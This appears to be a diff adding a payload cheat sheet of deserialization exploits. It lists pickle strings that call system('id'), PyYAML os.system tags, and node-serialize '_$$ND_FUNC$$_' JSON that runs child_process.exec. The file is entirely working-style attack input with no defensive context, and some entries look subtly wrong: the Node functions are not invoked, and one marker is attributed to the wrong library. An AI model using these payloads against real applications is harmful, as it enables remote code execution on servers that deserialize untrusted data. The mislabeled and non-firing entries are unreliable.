@@ -1,0 +1,16 @@
+# Python & Node.js Deserialization Payloads
+
+# Python Pickle (Base64)
+gASVDAAAAAAAAACMBXN5c3RlbZSTpE0BSv9SlC4= (system('id'))
+cos\nsystem\n(S'id'\ntR.
+
+# Python YAML (PyYAML Bypasses)
+!!python/object/apply:os.system [id]
+!!python/object/new:os.system [id]
+
+# Node.js (node-serialize)
+{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('id', function(error, stdout, stderr) { console.log(stdout) });}"}
+{"rce":"_$$ND_FUNC$$_function (){require('os').hostname()}"}
+
+# Node.js (serialize-javascript)
+{"fn":"_$$ND_FUNC$$_process.stdout.write('pwned')"}
